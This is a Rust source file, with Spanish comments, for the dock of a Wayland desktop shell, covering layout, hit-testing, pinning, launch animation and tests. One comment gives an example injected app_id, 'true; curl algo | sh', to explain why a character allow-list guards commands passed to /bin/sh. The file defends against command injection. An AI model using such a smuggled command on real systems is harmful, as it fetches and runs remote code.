//! El dock: rectángulo redondeado con los lanzadores, abajo y centrado.
//!
//! La geometría de partida salió del prototipo `bookos/prototypes/DockMagnify.qml`
//! —icono de 50, hueco de 14, esquinas de 22 (redondeado, no cápsula)—, con el
//! padding retocado después: los 9 px calibrados en QML dejaban el primer y el
//! último icono pegados al borde redondeado del dock.
//!
//! El puntero ya llega: se señala el icono de debajo, se pulsa y se lanza, y un
//! punto marca las aplicaciones que tienen ventana.
//!
//! **La lente de aumento sigue sin estar**, y ya no es por falta de puntero.
//! `DockMagnify.qml` la define con `magnifyScale = 1.5` e `influence = 110 px`,
//! o sea que el icono señalado crece hasta 75 px y empuja a sus vecinos: el
//! buffer tendría que reservar ese crecimiento por arriba y por los lados, y el
//! fondo redondeado redimensionarse con él, que es rehacer la geometría que
//! ahora está calibrada contra el prototipo. Además el prototipo hace la
//! entrada y la salida suaves (`lensStrength`), y aquí eso significa un
//! temporizador repintando por fotograma — justo lo que este compositor evita.

use std::path::PathBuf;
use std::time::SystemTime;

use iced_core::{Border, Color, Length};
use iced_widget::{Space, column, container, image as iced_image, row, svg, text};

use crate::icono::{self, Icono};
use crate::tema;
use crate::view::{ACENTO, PanelElement, TEXT};

pub const ICON: f32 = 50.0;
pub const GAP: f32 = 14.0;
/// Padding horizontal: del borde del dock al primer y al último icono.
///
/// Antes iba a 9 en las cuatro direcciones —lo que traía calibrado
/// `DockMagnify.qml`—, y con la esquina de 22 px (`tema::R_TARJETA`) la curva
/// se comía casi todo ese aire: el dock se leía más estrecho de lo que medía,
/// con los iconos de los extremos tocando el borde redondeado.
pub const PAD: f32 = 15.0;
/// Padding vertical. Va aparte del horizontal por la misma razón que subió
/// `PAD`, pero no tiene por qué valer lo mismo: aquí no hay ningún icono en
/// el extremo que se lea pegado a una esquina, solo al borde recto de arriba
/// y de abajo.
pub const PAD_V: f32 = 15.0;
/// Separación entre el dock y el borde inferior de la pantalla.
pub const MARGIN: f32 = 12.0;

/// El `card` del sistema de diseño, oscurecido en el tema oscuro y con una
/// opacidad algo menor para que el dock siga flotando sobre el fondo.
fn fondo() -> Color {
    Color {
        a: 0.75,
        ..if tema::es_claro() {
            tema::card()
        } else {
            tema::mezclar(tema::card(), Color::BLACK, 0.40)
        }
    }
}

/// El mismo fondo cuando el dock está pegado al borde. Más cuerpo que el
/// flotante: apoyado en el borde deja de leerse como algo que va y viene y pasa
/// a ser parte del marco de la pantalla.
fn fondo_pegado() -> Color {
    Color {
        a: 0.75,
        ..if tema::es_claro() {
            tema::card()
        } else {
            tema::mezclar(tema::card(), Color::BLACK, 0.40)
        }
    }
}

/// Alto de la banda del indicador de ventana abierta, bajo el icono.
const PUNTO: f32 = 7.0;

/// Padding de arriba y de abajo del icono, ya descontada la banda del
/// indicador.
///
/// Con `PAD_V` a secas arriba y abajo, el bloque icono+indicador —que mide
/// `tamano + PUNTO`— quedaba centrado como bloque, pero el indicador es
/// invisible cuando la app no tiene ventana: lo que se ve es el icono solo,
/// desplazado `PUNTO / 2` hacia arriba del centro real del dock. Pasar la
/// mitad de esa banda del padding de abajo al de arriba lo baja al centro sin
/// tocar el alto total (`PAD_V_ARRIBA + PAD_V_ABAJO` sigue siendo `PAD_V * 2`):
/// 18,5 por encima del icono y 7 + 11,5 por debajo.
///
/// Estuvo con el signo al revés —restando arriba y sumando abajo—, que
/// duplicaba el desplazamiento en vez de quitarlo: medido en pantalla, 11,5
/// por encima del icono y 25,5 por debajo.
const PAD_V_ARRIBA: f32 = PAD_V + PUNTO / 2.0;
/// Altura del rebote al lanzar, sacada del margen de arriba (el relleno es
/// `PAD_V_ARRIBA - BOTE` y cada icono lleva este hueco encima): por ahí
/// salta. Así el dock no cambia de tamaño ni recorta el salto, que se saldría
/// del buffer si fuera más alto.
const BOTE: f32 = 12.0;
/// Un salto completo, subida y bajada. El de macOS ronda los 0,6 s.
const PERIODO_BOTE: f32 = 0.6;
/// Si la ventana no aparece en este tiempo se deja de rebotar: una orden que
/// falla, o un `app_id` que no casa con el lanzador, no puede dejar el icono
/// saltando para siempre.
const LIMITE_BOTE: std::time::Duration = std::time::Duration::from_secs(10);
const PAD_V_ABAJO: f32 = PAD_V - PUNTO / 2.0;

/// ¿Se puede pasar esto a un intérprete de órdenes sin miedo?
///
/// El juego de caracteres de un `app_id` de verdad —`org.kde.konsole`,
/// `firefox`, `code-oss`— y ni uno más. Nada de espacios, comillas, `;`, `|`,
/// `$` ni `&`: eso ya no es un nombre de programa, es una orden.
fn lanzable(id: &str) -> bool {
    !id.is_empty()
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
}

/// Un lanzador del dock.
pub struct DockItem {
    /// Lo que se ejecuta al pulsarlo.
    pub exec: String,
    pub label: String,
    /// Con qué `app_id` de Wayland se corresponde, para saber si ya está
    /// abierto. Ver [`Dock::set_abiertas`].
    app_id: String,
    icon: Option<Icono>,
    /// Con qué nombre se pidió el icono. Hace falta para volver a escribir la
    /// lista en la configuración al anclar o desanclar algo: sin él habría que
    /// adivinarlo del `exec`, y no siempre coinciden.
    icono_nombre: String,
    /// Cuándo se reescribió en disco el icono, solo si es dinámico. Ver
    /// [`Dock::refrescar_dinamicos`].
    icono_modificado: Option<SystemTime>,
    /// Tiene al menos una ventana en el escritorio.
    abierta: bool,
    /// Se lanzó y todavía no tiene ventana: el icono rebota mientras tanto.
    lanzado: Option<std::time::Instant>,
    /// Está fijada por el usuario. Los que no lo están salen en el dock solo
    /// mientras tienen ventana —como en macOS— y desaparecen al cerrarla; son
    /// también los que se pueden fijar con el clic derecho, porque hasta que
    /// una aplicación no se abre no hay dónde pulsar para anclarla.
    anclada: bool,
}

impl DockItem {
    /// Busca el icono en los temas del sistema. Si no aparece, el item se
    /// dibuja igual con una baldosa y su inicial: un icono que falta no puede
    /// dejar un hueco en el dock.
    pub fn new(exec: &str, label: &str, icon_name: &str, app_id: &str) -> Self {
        let icon = icono::cargar(icon_name);
        Self {
            exec: exec.to_string(),
            label: label.to_string(),
            app_id: app_id.to_string(),
            icono_nombre: icon_name.to_string(),
            icono_modificado: icono::modificado_si_dinamico(icon_name),
            anclada: true,
            icon,
            abierta: false,
            lanzado: None,
        }
    }

    /// ¿Es este `app_id` de Wayland el de este lanzador?
    fn es_suya(&self, app_id: &str) -> bool {
        crate::mismo_programa(&self.app_id, app_id)
    }

    pub fn exec(&self) -> &str {
        &self.exec
    }

    pub fn icono_nombre(&self) -> &str {
        &self.icono_nombre
    }

    pub fn app_id(&self) -> &str {
        &self.app_id
    }

    /// ¿Tiene ya alguna ventana abierta? Lo fija [`Dock::set_abiertas`].
    pub fn anclada(&self) -> bool {
        self.anclada
    }

    pub fn abierta(&self) -> bool {
        self.abierta
    }

    pub fn has_icon(&self) -> bool {
        self.icon.is_some()
    }

    /// Cuánto se levanta ahora mismo, de 0 a [`BOTE`].
    fn salto(&self) -> f32 {
        let Some(desde) = self.lanzado else {
            return 0.0;
        };
        let t = desde.elapsed();
        if t >= LIMITE_BOTE || tema::efectos_reducidos() {
            return 0.0;
        }
        (t.as_secs_f32() / PERIODO_BOTE * std::f32::consts::PI)
            .sin()
            .abs()
            * BOTE
    }
}

pub struct Dock {
    tamano: f32,
    items: Vec<DockItem>,
    arrastrado: Option<String>,
    /// Índice del icono bajo el puntero, si lo hay.
    /// El icono señalado, con su placa entrando y saliendo.
    hover: tema::Realce,
    /// Apoyado en el borde inferior. Lo decide el compositor, que es quien sabe
    /// si el dock está fijo o esquivando ventanas.
    pegado: bool,
}

impl Dock {
    pub fn tamano_actual(&self) -> u32 {
        self.tamano as u32
    }
    pub fn tamano(&mut self, tamano: u32) {
        self.tamano = tamano.clamp(32, 80) as f32;
        self.hover.señalar(None);
    }

    /// Ancla sin alternar. Es lo que hace arrastrar un icono del launchpad
    /// hasta el dock: soltar algo que ya estaba anclado no puede desanclarlo,
    /// que es lo que haría [`Self::alternar_anclado`]. `true` si cambió algo.
    pub fn anclar(&mut self, app_id: &str, exec: &str, icono: &str) -> bool {
        match self.indice_de(app_id) {
            Some(i) if self.items[i].anclada => false,
            Some(i) => {
                self.items[i].anclada = true;
                true
            }
            None => {
                self.items.push(DockItem::new(exec, app_id, icono, app_id));
                true
            }
        }
    }

    /// Desancla sin alternar: sacar un icono del dock arrastrándolo.
    ///
    /// El launchpad no se puede sacar —es la única forma de abrir lo que no
    /// está en el dock— y por eso se comprueba aquí y no en quien llama.
    pub fn desanclar(&mut self, app_id: &str) -> bool {
        let Some(i) = self.indice_de(app_id) else {
            return false;
        };
        if self.items[i].exec == crate::config::LAUNCHPAD || !self.items[i].anclada {
            return false;
        }
        if self.items[i].abierta {
            self.items[i].anclada = false;
        } else {
            self.items.remove(i);
            self.hover.señalar(None);
        }
        true
    }

    /// Ancla una aplicación o la desancla si ya estaba. Es lo del menú del
    /// clic derecho, donde una sola entrada dice «Fijar» o «Soltar».
    ///
    /// El launchpad no se toca: es parte del escritorio, no un lanzador que se
    /// quita. Y lo anclado se añade al final, que es donde la mano espera
    /// encontrar lo último que puso.
    pub fn alternar_anclado(&mut self, app_id: &str, exec: &str, icono: &str) {
        if let Some(i) = self.indice_de(app_id) {
            // El launchpad no es una aplicación: quitarlo dejaría el dock sin
            // la única forma de abrir lo que no está en él.
            if self.items[i].exec == crate::config::LAUNCHPAD {
                return;
            }
            if self.items[i].anclada {
                // Desanclar algo que está abierto no lo borra del dock: la
                // ventana sigue ahí y su icono tiene que seguir enseñándola.
                if self.items[i].abierta {
                    self.items[i].anclada = false;
                } else {
                    self.items.remove(i);
                    self.hover.señalar(None);
                }
            } else {
                self.items[i].anclada = true;
            }
            return;
        }
        self.items.push(DockItem::new(exec, app_id, icono, app_id));
    }

    pub fn esta_anclada(&self, app_id: &str) -> bool {
        self.indice_de(app_id)
            .is_some_and(|i| self.items[i].anclada)
    }

    fn indice_de(&self, app_id: &str) -> Option<usize> {
        self.items
            .iter()
            .position(|i| crate::mismo_programa(i.app_id(), app_id) || i.app_id() == app_id)
    }

    pub fn arrastrar(&mut self, app_id: Option<&str>) {
        self.arrastrado = app_id.map(str::to_owned);
        self.hover.señalar(None);
    }

    pub fn vista_agarrado(&self) -> Option<PanelElement<'_>> {
        let i = self.indice_de(self.arrastrado.as_deref()?)?;
        Some(contenido_icono(&self.items[i], self.tamano))
    }

    pub fn mover(&mut self, app_id: &str, x: f32) -> bool {
        let Some(origen) = self.indice_de(app_id) else {
            return false;
        };
        // Se cambia de hueco a mitad de camino entre centros. Así cruzar el
        // espacio entre iconos no devuelve el arrastrado a su sitio anterior.
        let destino = ((x - PAD - self.tamano / 2.0) / (self.tamano + GAP))
            .round()
            .clamp(0.0, (self.items.len() - 1) as f32) as usize;
        if origen == destino {
            return false;
        }
        let item = self.items.remove(origen);
        self.items.insert(destino, item);
        self.hover.señalar(None);
        true
    }

    /// La lista tal y como se escribe en `panel.conf`, para poder guardarla.
    pub fn como_configuracion(&self) -> Vec<String> {
        self.items
            .iter()
            .filter(|i| i.anclada)
            .map(|i| format!("{}:{}:{}:{}", i.exec, i.label, i.icono_nombre(), i.app_id()))
            .collect()
    }

    /// Los lanzadores que diga la configuración.
    pub fn from_config(specs: &[crate::config::Lanzador]) -> Self {
        let items = specs
            .iter()
            .map(|l| DockItem::new(&l.exec, &l.etiqueta, &l.icono, &l.app_id))
            .collect();
        Self {
            items,
            arrastrado: None,
            hover: tema::Realce::nuevo(),
            pegado: true,
            tamano: ICON,
        }
    }

    /// Vuelve a leer los iconos que cambian solos (reloj, calendario).
    /// Devuelve `true` si alguno cambió, que es cuando hay que repintar.
    ///
    /// Se mira el `mtime` antes de leer: el calendario reescribe su PNG una vez
    /// al día y esto se llama cada minuto y con cada aviso del kernel. Sin la
    /// comprobación, cada llamada decodificaba el PNG en un `Handle` de id
    /// nuevo —iced vuelve a subir la imagen— y repintaba el dock entero.
    pub fn refrescar_dinamicos(&mut self) -> bool {
        let mut cambio = false;
        for item in self
            .items
            .iter_mut()
            .filter(|i| icono::es_dinamico(&i.icono_nombre))
        {
            let modificado = icono::modificado_si_dinamico(&item.icono_nombre);
            if modificado == item.icono_modificado {
                continue;
            }
            item.icono_modificado = modificado;
            item.icon = icono::cargar(&item.icono_nombre);
            cambio = true;
        }
        cambio
    }

    /// Vuelve a cargar todos los iconos, tras cambiar el tema de iconos.
    pub fn recargar_iconos(&mut self) {
        for item in &mut self.items {
            item.icon = icono::cargar(&item.icono_nombre);
        }
    }

    /// Marca qué lanzadores tienen ventana abierta, a partir de los `app_id`
    /// que hay en el escritorio. Devuelve `true` si cambió algo.
    ///
    /// Recibe los `app_id` y no una lista de índices para que el compositor no
    /// tenga que saber cómo está montado el dock: él sabe qué ventanas hay, el
    /// dock sabe a quién corresponden.
    pub fn set_abiertas(&mut self, app_ids: &[String]) -> bool {
        let mut cambio = false;
        for item in &mut self.items {
            let abierta = app_ids.iter().any(|id| item.es_suya(id));
            if item.abierta != abierta {
                item.abierta = abierta;
                cambio = true;
            }
            if abierta {
                item.lanzado = None;
            }
        }
        // Lo que está abierto y no tiene lanzador entra en el dock mientras
        // dure la ventana. Es lo que hace macOS y lo que hace falta para poder
        // fijar una aplicación: sin esto, el clic derecho no tendría dónde
        // caer para algo que no está ya en el dock.
        for id in app_ids {
            if self.indice_de(id).is_some() {
                continue;
            }
            let app = crate::apps::por_app_id(id);
            // Sin `.desktop` se tira del propio `app_id`: como etiqueta, su
            // último componente —`org.gnome.Calculator` enseña "Calculator" y
            // no una "O" de inicial—, y como icono el id entero, que es el
            // nombre con el que la mayoría de temas lo tienen.
            let respaldo = id.rsplit('.').next().unwrap_or(id);
            let (exec, label, icono) = match &app {
                Some(a) => (a.exec.as_str(), a.nombre.as_str(), a.icono.as_str()),
                // El `app_id` lo elige el cliente y no lo comprueba nadie, y de
                // aquí acaba en `/bin/sh -c`: uno que se llame
                // `true; curl algo | sh` ejecutaría eso al pulsar su icono. El
                // que no parezca un nombre de programa entra en el dock sin
                // nada que lanzar; el icono sigue saliendo mientras su ventana
                // viva, que es para lo que está.
                None if lanzable(id) => (id.as_str(), respaldo, id.as_str()),
                None => ("", respaldo, id.as_str()),
            };
            let mut item = DockItem::new(exec, label, icono, id);
            item.anclada = false;
            item.abierta = true;
            self.items.push(item);
            cambio = true;
        }
        // Y se van al cerrarse.
        let antes = self.items.len();
        self.items.retain(|i| i.anclada || i.abierta);
        if self.items.len() != antes {
            self.hover.señalar(None);
            cambio = true;
        }
        cambio
    }

    pub fn items(&self) -> &[DockItem] {
        &self.items
    }

    /// Qué icono cae bajo un punto **lógico relativo a la esquina superior
    /// izquierda del dock**.
    ///
    /// El hit-test es aritmético y no pasa por iced a propósito. Los slots son
    /// de tamaño fijo y están en fila, así que el índice sale de una resta y
    /// una división; hacerlo con `UserInterface::update` obligaría a cambiar el
    /// tipo de mensaje de todo el crate, a mantener un `Clipboard` que no
    /// usamos y a sincronizar la caché entre `update` y `draw`. Cuando haya un
    /// widget con estado interno de verdad —un deslizador de volumen— entonces
    /// sí hará falta el camino de iced.
    pub fn item_en(&self, x: f32, y: f32) -> Option<usize> {
        // La banda del indicador cuenta como parte del icono: pulsar el punto
        // de "abierta" es pulsar la aplicación, no un hueco muerto.
        if y < PAD_V_ARRIBA || y > PAD_V_ARRIBA + self.tamano + PUNTO {
            return None;
        }
        let rel = x - PAD;
        if rel < 0.0 {
            return None;
        }
        let paso = self.tamano + GAP;
        let i = (rel / paso) as usize;
        // El hueco entre dos iconos no es de nadie: pulsar ahí no debe lanzar
        // el de la izquierda.
        if rel - i as f32 * paso > self.tamano {
            return None;
        }
        (i < self.items.len()).then_some(i)
    }

    /// Marca qué icono está señalado. Devuelve `true` si cambió, que es la
    /// señal de que hay que repintar.
    pub fn set_hover(&mut self, hover: Option<usize>) -> bool {
        self.hover.señalar(hover)
    }

    /// ¿Sigue moviéndose la placa de algún icono? Mientras sí, el dock hay que
    /// repintarlo aunque no llegue ningún evento: es la única superficie del
    /// shell que se anima sin que nadie la toque después del último movimiento
    /// del ratón.
    pub fn animando(&self) -> bool {
        // Un fotograma de margen tras el límite: es el que deja el icono
        // apoyado, que si no se quedaría congelado a media altura.
        self.hover.animando()
            || self.items.iter().any(|i| {
                i.lanzado.is_some_and(|d| {
                    d.elapsed() < LIMITE_BOTE + std::time::Duration::from_millis(100)
                })
            })
    }

    /// Avisa de que se acaba de lanzar `exec`. Si es de un icono del dock que
    /// aún no tiene ventana, rebota hasta que aparezca: sin esto, una
    /// aplicación pesada tardaba segundos en dar señales y se volvía a pulsar.
    /// Devuelve `true` si hay que repintar.
    pub fn lanzando(&mut self, exec: &str) -> bool {
        let Some(item) = self
            .items
            .iter_mut()
            .find(|i| !i.abierta && i.exec.trim() == exec.trim())
        else {
            return false;
        };
        item.lanzado = Some(std::time::Instant::now());
        true
    }

    /// El lanzador que hay bajo `(x, y)`, en las mismas coordenadas que
    /// [`Dock::item_en`].
    ///
    /// Devuelve el item entero y no solo su `exec` porque pulsar un programa ya
    /// abierto no es lanzarlo otra vez: hay que traer su ventana al frente, y
    /// para eso quien decide necesita el `app_id`.
    pub fn pulsado(&self, x: f32, y: f32) -> Option<&DockItem> {
        self.item_en(x, y).map(|i| &self.items[i])
    }

    /// El centro **horizontal** del icono `i`, relativo al dock. Lo necesita el
    /// menú contextual para salir justo encima de él.
    pub fn centro_de(&self, i: usize) -> f32 {
        PAD + i as f32 * (self.tamano + GAP) + self.tamano / 2.0
    }

    /// Tamaño lógico del dock, derivado del número de items.
    ///
    /// El alto lleva la banda del indicador de ventana abierta además del
    /// icono: el punto no cabe en el padding sin comerse el borde redondeado.
    pub fn size(&self) -> (f32, f32) {
        let n = self.items.len().max(1) as f32;
        (
            PAD * 2.0 + n * self.tamano + (n - 1.0) * GAP,
            PAD_V * 2.0 + self.tamano + PUNTO,
        )
    }

    pub fn view(&self) -> PanelElement<'_> {
        // Todos los lanzadores comparten el mismo eje vertical, aunque el
        // contenido interno de algún icono tenga transparencias distintas.
        let mut fila = row![]
            .spacing(GAP)
            .align_y(iced_core::alignment::Vertical::Center);
        for (i, item) in self.items.iter().enumerate() {
            let vista = if self.arrastrado.as_deref() == Some(item.app_id()) {
                let hueco = container(Space::new())
                    .width(Length::Fixed(self.tamano))
                    .height(Length::Fixed(self.tamano))
                    .style(|_theme| container::Style {
                        background: Some(tema::hover().into()),
                        border: Border {
                            radius: tema::R_CONTROL.into(),
                            width: 1.0,
                            color: tema::alfa(tema::acento(), 0.35),
                        },
                        ..Default::default()
                    });
                column![
                    Space::new().height(Length::Fixed(BOTE)),
                    hueco,
                    punto(item.abierta, self.tamano)
                ]
                .into()
            } else {
                icon_view(item, self.hover.intensidad(i), self.tamano)
            };
            fila = fila.push(vista);
        }

        // Pegado al borde solo se redondea por arriba: unas esquinas curvas
        // contra el canto de la pantalla dejan dos triángulos de escritorio
        // asomando debajo, que es justo lo que delata que la barra no está
        // realmente apoyada.
        let (fondo, radio) = if self.pegado {
            (
                fondo_pegado(),
                iced_core::border::Radius::default()
                    .top_left(tema::R_TARJETA)
                    .top_right(tema::R_TARJETA),
            )
        } else {
            (fondo(), tema::R_TARJETA.into())
        };
        container(fila)
            .padding(iced_core::Padding {
                top: PAD_V_ARRIBA - BOTE,
                bottom: PAD_V_ABAJO,
                left: PAD,
                right: PAD,
            })
            .style(move |_theme| container::Style {
                background: Some(fondo.into()),
                border: Border {
                    radius: radio,
                    ..Default::default()
                },
                ..Default::default()
            })
            .into()
    }

    /// Dice si el dock está apoyado en el borde de la pantalla. `true` si eso
    /// cambia el dibujo.
    pub fn set_pegado(&mut self, pegado: bool) -> bool {
        if self.pegado == pegado {
            return false;
        }
        self.pegado = pegado;
        true
    }
}

/// El icono, con una placa detrás cuando está señalado.
///
/// Todavía no es la lente de `DockMagnify.qml`: magnificar de verdad exige que
/// el icono se salga de su slot, y el buffer del dock hoy mide exactamente
/// `PAD_V*2 + self.tamano` de alto, así que lo ampliado quedaría cortado. Reservar ese
/// hueco cambia la geometría ya calibrada y va aparte.
fn contenido_icono(item: &DockItem, tamano: f32) -> PanelElement<'_> {
    match &item.icon {
        Some(Icono::Svg(handle)) => svg(handle.clone())
            .width(Length::Fixed(tamano))
            .height(Length::Fixed(tamano))
            .into(),
        Some(Icono::Raster(handle)) => iced_image(handle.clone())
            .width(Length::Fixed(tamano))
            .height(Length::Fixed(tamano))
            .into(),
        None => {
            // Baldosa con la inicial. Fea a propósito: se ve que falta el icono.
            let inicial = item
                .label
                .chars()
                .next()
                .map(|c| c.to_uppercase().to_string())
                .unwrap_or_default();
            container(
                container(text(inicial).size(22).color(TEXT()))
                    .center_x(Length::Fill)
                    .center_y(Length::Fill),
            )
            .width(Length::Fixed(tamano))
            .height(Length::Fixed(tamano))
            .style(|_theme| container::Style {
                background: Some(
                    Color {
                        a: 0.25,
                        ..ACENTO()
                    }
                    .into(),
                ),
                border: Border {
                    radius: tema::R_BOTON.into(),
                    ..Default::default()
                },
                ..Default::default()
            })
            .into()
        }
    }
}

fn icon_view(item: &DockItem, señalado: f32, tamano: f32) -> PanelElement<'_> {
    let contenido = contenido_icono(item, tamano);
    // La placa se desvanece en vez de encenderse de golpe: el dock es lo que
    // más se recorre con el ratón y el parpadeo de seis placas al cruzarlo era
    // lo más aparatoso que le quedaba al shell. Por debajo del 1 % de alfa no
    // se dibuja el contenedor, para no meter una capa por nada.
    let icono: PanelElement<'_> = if señalado > 0.01 {
        container(contenido)
            .style(move |_theme| container::Style {
                background: Some(tema::alfa(TEXT(), 0.18 * señalado).into()),
                border: Border {
                    radius: tema::R_CONTROL.into(),
                    ..Default::default()
                },
                ..Default::default()
            })
            .into()
    } else {
        contenido
    };

    // El salto pasa el aire de encima a debajo: el alto total no cambia y el
    // punto acompaña al icono, como en macOS.
    let salto = item.salto();
    column![
        Space::new().height(Length::Fixed(BOTE - salto)),
        icono,
        punto(item.abierta, tamano),
        Space::new().height(Length::Fixed(salto)),
    ]
    .into()
}

/// El indicador de "esta aplicación tiene ventana", bajo el icono.
///
/// Siempre ocupa su sitio, esté encendido o no: si el hueco apareciera y
/// desapareciera, el dock entero cambiaría de alto al abrir una ventana.
fn punto<'a>(encendida: bool, tamano: f32) -> PanelElement<'a> {
    let color = if encendida {
        Color { a: 0.85, ..TEXT() }
    } else {
        Color::TRANSPARENT
    };
    container(
        container(
            Space::new()
                .width(Length::Fixed(5.0))
                .height(Length::Fixed(5.0)),
        )
        .style(move |_theme| container::Style {
            background: Some(color.into()),
            border: Border {
                radius: tema::R_PILL.into(),
                ..Default::default()
            },
            ..Default::default()
        }),
    )
    .width(Length::Fixed(tamano))
    .height(Length::Fixed(PUNTO))
    .center_x(Length::Fixed(tamano))
    .into()
}

/// Ayuda para depurar la resolución de iconos desde fuera del crate.
pub fn icon_path(name: &str) -> Option<PathBuf> {
    icono::resolve_icon(name)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Un dock de tres items sin tocar el disco: `DockItem::new` buscaría
    /// iconos por medio sistema de ficheros y el hit-test no depende de eso.
    fn dock(n: usize) -> Dock {
        let items = (0..n)
            .map(|i| DockItem {
                exec: format!("prog{i}"),
                label: format!("P{i}"),
                app_id: format!("org.bookos.prog{i}"),
                icono_nombre: String::new(),
                icono_modificado: None,
                icon: None,
                anclada: true,
                abierta: false,
                lanzado: None,
            })
            .collect();
        Dock {
            items,
            arrastrado: None,
            tamano: ICON,
            hover: tema::Realce::nuevo(),
            pegado: true,
        }
    }

    #[test]
    fn mover_un_icono_inserta_sin_intercambiar_a_los_vecinos() {
        let mut d = dock(4);
        assert!(d.mover("org.bookos.prog1", d.centro_de(3)));
        let orden: Vec<_> = d.items().iter().map(|i| i.exec()).collect();
        assert_eq!(orden, ["prog0", "prog2", "prog3", "prog1"]);
        assert!(d.mover("org.bookos.prog1", d.centro_de(0)));
        let orden: Vec<_> = d.items().iter().map(|i| i.exec()).collect();
        assert_eq!(orden, ["prog1", "prog0", "prog2", "prog3"]);
    }

    #[test]
    fn ordenar_acota_los_extremos_y_no_oscila_en_los_huecos() {
        let mut d = dock(3);
        assert!(d.mover("org.bookos.prog1", -50.0));
        assert!(!d.mover("org.bookos.prog1", d.centro_de(0) + 10.0));
        assert!(d.mover("org.bookos.prog1", d.size().0 + 50.0));
        assert!(!d.mover("desconocida", d.centro_de(0)));
        assert!(!dock(0).mover("desconocida", 0.0));
    }

    #[test]
    fn las_aplicaciones_temporales_no_se_anclan_al_reordenar() {
        let mut d = dock(3);
        d.items[1].anclada = false;
        d.items[1].abierta = true;
        assert!(d.mover("org.bookos.prog1", d.centro_de(0)));
        let guardado = d.como_configuracion();
        assert_eq!(guardado.len(), 2);
        assert!(!d.items()[0].anclada());
        assert!(guardado.iter().all(|s| !s.contains("prog1")));
        d.set_abiertas(&[]);
        assert_eq!(d.items().len(), 2);
        assert_eq!(d.items()[0].exec(), "prog0");
    }

    #[test]
    fn el_centro_de_cada_icono_es_suyo() {
        let d = dock(3);
        let centro = |i: usize| PAD + i as f32 * (ICON + GAP) + ICON / 2.0;
        assert_eq!(d.item_en(centro(0), PAD_V_ARRIBA + ICON / 2.0), Some(0));
        assert_eq!(d.item_en(centro(1), PAD_V_ARRIBA + ICON / 2.0), Some(1));
        assert_eq!(d.item_en(centro(2), PAD_V_ARRIBA + ICON / 2.0), Some(2));
    }

    #[test]
    fn tamano_configurable_conserva_los_hit_tests() {
        let mut d = dock(3);
        for tamano in [0, 32, 50, 80, 200] {
            d.tamano(tamano);
            let lado = tamano.clamp(32, 80) as f32;
            assert_eq!(d.tamano_actual(), lado as u32);
            for i in 0..3 {
                assert_eq!(
                    d.item_en(
                        PAD + i as f32 * (lado + GAP) + lado / 2.0,
                        PAD_V_ARRIBA + lado / 2.0
                    ),
                    Some(i)
                );
            }
            assert_eq!(d.size().1, PAD_V * 2.0 + lado + PUNTO);
        }
    }

    #[test]
    fn el_hueco_entre_iconos_no_es_de_nadie() {
        let d = dock(3);
        // Justo en medio del GAP que separa el primero del segundo.
        let x = PAD + ICON + GAP / 2.0;
        assert_eq!(d.item_en(x, PAD_V_ARRIBA + ICON / 2.0), None);
    }

    #[test]
    fn fuera_del_dock_no_hay_item() {
        let d = dock(3);
        let y = PAD_V_ARRIBA + ICON / 2.0;
        // El padding de la izquierda y la franja de arriba.
        assert_eq!(d.item_en(PAD / 2.0, y), None);
        assert_eq!(d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA / 2.0), None);
        // Abajo, el icono llega hasta el final de la banda del indicador: ese
        // punto es de la aplicación, no un hueco muerto.
        assert_eq!(
            d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA + ICON + PUNTO / 2.0),
            Some(0)
        );
        assert_eq!(
            d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA + ICON + PUNTO + 1.0),
            None
        );
        // Y más allá del último icono, dentro del ancho por el padding derecho.
        let (ancho, _) = d.size();
        assert_eq!(d.item_en(ancho - PAD / 2.0, y), None);
    }

    /// La correspondencia entre el lanzador y la ventana es heurística, así que
    /// conviene fijar exactamente qué casa y qué no.
    /// Lanzar un icono sin ventana lo pone a rebotar, y la ventana lo para.
    #[test]
    fn lanzar_rebota_hasta_que_hay_ventana() {
        let mut d = dock(2);
        assert!(
            !d.lanzando("otra-cosa"),
            "lo que no está en el dock no rebota"
        );
        assert!(d.lanzando("prog1"));
        assert!(d.animando());
        d.set_abiertas(&["org.bookos.prog1".to_string()]);
        assert!(
            !d.animando(),
            "con la ventana ya abierta se deja de rebotar"
        );
        assert!(!d.lanzando("prog1"), "una ya abierta no rebota otra vez");
    }

    #[test]
    fn la_ventana_se_reconoce_por_el_sufijo_del_app_id() {
        let item = DockItem {
            exec: "konsole".into(),
            label: "Terminal".into(),
            app_id: "konsole".into(),
            icono_nombre: "konsole".into(),
            icono_modificado: None,
            icon: None,
            anclada: true,
            abierta: false,
            lanzado: None,
        };
        assert!(item.es_suya("konsole"));
        assert!(item.es_suya("org.kde.konsole"));
        assert!(item.es_suya("org.kde.Konsole"), "el caso no debe importar");
        // Parecerse no basta: sin esto, "konsole-profile" contaría como abierta.
        assert!(!item.es_suya("org.kde.konsole-profile"));
        assert!(!item.es_suya("konsole.parte"));
    }

    #[test]
    fn marcar_las_mismas_ventanas_no_obliga_a_repintar() {
        let mut d = dock(2);
        assert!(d.set_abiertas(&["org.bookos.prog0".to_string()]));
        assert!(!d.set_abiertas(&["org.bookos.prog0".to_string()]));
        assert!(d.set_abiertas(&[]));
    }

    #[test]
    fn señalar_dos_veces_el_mismo_icono_no_obliga_a_repintar() {
        let mut d = dock(3);
        assert!(d.set_hover(Some(1)));
        assert!(!d.set_hover(Some(1)));
        assert!(d.set_hover(None));
    }
}

#[cfg(test)]
mod anclado {
    use super::*;

    /// Anclar y desanclar arrastrando no alternan: soltar dos veces la misma
    /// aplicación sobre el dock la deja anclada, no la quita.
    #[test]
    fn arrastrar_no_alterna() {
        let mut dock = Dock::from_config(&crate::Config::default().dock);
        assert!(dock.anclar("org.bookos.prueba", "prueba", "prueba"));
        assert!(
            !dock.anclar("org.bookos.prueba", "prueba", "prueba"),
            "la segunda vez no cambia nada"
        );
        assert!(dock.esta_anclada("org.bookos.prueba"));

        assert!(dock.desanclar("org.bookos.prueba"));
        assert!(!dock.esta_anclada("org.bookos.prueba"));
        assert!(
            !dock.desanclar("org.bookos.prueba"),
            "sacar lo que ya no está no hace nada"
        );
    }

    /// El launchpad no se saca del dock por mucho que se arrastre: sin él no
    /// hay forma de abrir lo que no está anclado.
    #[test]
    fn el_launchpad_no_se_arrastra_fuera() {
        let mut dock = Dock::from_config(&crate::Config::default().dock);
        let antes = dock.items().len();
        let id = dock.items()[0].app_id().to_string();
